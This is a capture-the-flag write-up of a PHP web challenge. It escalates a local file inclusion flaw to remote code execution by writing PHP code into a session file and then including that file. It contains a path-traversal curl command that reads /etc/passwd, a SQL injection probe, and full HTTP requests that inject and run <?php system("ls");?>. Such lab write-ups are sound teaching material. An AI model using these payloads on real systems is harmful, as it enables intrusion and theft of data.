
## Local file inclusion

We have a few tabs in main page. Two of the reachable pages set the value of the `f` parameter to a php file.  
Replacing the php file with a non existing file (e.g. `ciao.php`) triggers an error, revealing the function used by the web server: `include("files/ciao.php"):`

Input is not sanitized nor escaped, we have local file inclusion (LFI).
The following command reveals the content of the password files
```
curl http://'138.68.141.182:31970/?f=../../../../etc/passwd'
```

But we are not done yet!  
The flag doesn't seem to be around.  
It is probably stored in a file called `flag$RANDOM_STUFF_HERE` 

Next steps:
- RFI? Not working because our input is preceded by `files`.
- LFI to read files that may contain information about the flag file (e.g. bash_history, access logs etc... ). We tried but no luck here.
- Maybe just a rabbit hole? We also play around with the website, exploring the `/send.php` page and trying a bunch of hopeless SQL queries (e.g `' or 1=1'`). Not very promising though.
- Upgrade our LFI to a remote code execution (RCE) by finding places where we can inject malicious code/files. In this way we have RCE by including that file.  
Let's dive into it!


## Upgrading from LFI to RCE 

### Detecting the possible upgrade
A blog post comes in our help: https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/  

We actually have the session cookies set. Why should we even have session cookies here? It does seem a bit strange.
```
Cookie: PHPSESSID=dde5c335a8381e3504a3b704d36c6786
```

Let's see if we can find and access the php session files as showed in the blog post above. We expect the filename to be `sess_dde5c335a8381e3504a3b704d36c6786`.  
The responses of the server expose the PHP version in use, `7.4`.  
We try a bunch of possible paths (`../../../../../../var/lib/php7/sess_dde5c335a8381e3504a3b704d36c6786` and variants).  
Eventually we end up finding the file in the `/tmp/` directory.

We can thus print the content of our session file by setting the `f` parameter to
```
../../../../../../../tmp/sess_dde5c335a8381e3504a3b704d36c6786 
```
Content of the response: `' or 1=1'`

The response confirms that something strange is happening.  
But what? Where did I see that `' or 1=1'` before?  

It was the value that I've previously tried in the `/send.php` page.  
This means the code we inject in the `/send.php` page will be stored in the session file. We can then execute that code by including the session file as we did before.


### Remote Code Execution
We first inject our malicious php code in `/send.php`.
**Request:** (full Burp request)
```
POST /send.php HTTP/1.1
Host: 178.62.10.52:32013
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://178.62.10.52:32013
Connection: close
Referer: http://178.62.10.52:32013/send.php
Cookie: PHPSESSID=dde5c335a8381e3504a3b704d36c6786
Upgrade-Insecure-Requests: 1

name=<?php system("ls");?>
```
**Response:**
```
flag_ffacf623917dc0e2f83e9041644b3e98.txt
index.php
send.php
```

Now we know the name of the flag file.  
We can just get the flag.

**Request:**
```
GET /?f=../flag_ffacf623917dc0e2f83e9041644b3e98.txt HTTP/1.1
Host: 178.62.10.52:32013
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=dde5c335a8381e3504a3b704d36c6786
Upgrade-Insecure-Requests: 1
```
**Response:**
`CHTB{th4ts_4_w31rd3xt0rt10n@#$?}`